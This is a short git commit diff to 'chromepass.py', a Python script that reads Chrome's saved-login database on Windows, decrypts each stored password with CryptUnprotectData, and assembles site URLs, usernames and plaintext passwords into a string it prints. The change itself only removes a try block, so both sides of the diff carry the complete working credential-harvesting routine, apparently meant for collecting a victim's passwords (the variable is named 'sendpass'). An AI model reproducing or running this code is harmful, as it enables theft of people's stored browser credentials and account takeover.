ddced0e46d16727b55669044e5b29ca358c0f3e2
d4rkcat <d4rkcat@yandex.com>
2014-11-11 08:53:24 +0000

    Fix

--- chromepass.py
+++ chromepass.py
@@ -4,14 +4,13 @@ import win32crypt
 
 sendpass = ''
 appdata = getenv("APPDATA")
-try:
-	connection = sqlite3.connect(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep,sep))
-	cursor = connection.cursor()
-	cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
-	for information in cursor.fetchall():
-		passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
-		if passw:
-			sendpass += '**n [*] Website-origin: ' + information[0] + '**n [*] Website-action: ' + information[1]
-			sendpass += '**n [*] Username: ' + information[2]
-			sendpass += '**n [*] Password: ' + passw + '**n'
-	print sendpass
+connection = sqlite3.connect(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (sep,sep,sep,sep,sep,sep,sep))
+cursor = connection.cursor()
+cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
+for information in cursor.fetchall():
+	passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
+	if passw:
+		sendpass += '**n [*] Website-origin: ' + information[0] + '**n [*] Website-action: ' + information[1]
+		sendpass += '**n [*] Username: ' + information[2]
+		sendpass += '**n [*] Password: ' + passw + '**n'
+print sendpass
